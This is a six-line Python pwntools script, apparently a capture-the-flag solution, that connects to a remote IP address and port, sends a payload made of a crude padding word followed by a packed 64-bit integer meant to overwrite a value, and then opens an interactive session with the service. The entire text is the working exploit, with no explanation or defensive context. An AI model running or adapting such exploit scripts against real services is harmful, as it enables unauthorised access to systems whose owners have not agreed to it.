from pwn import *

io = remote('111.200.241.244', 51054)
payload = b'fuck' + p64(1853186401)
io.sendline(payload)
io.interactive()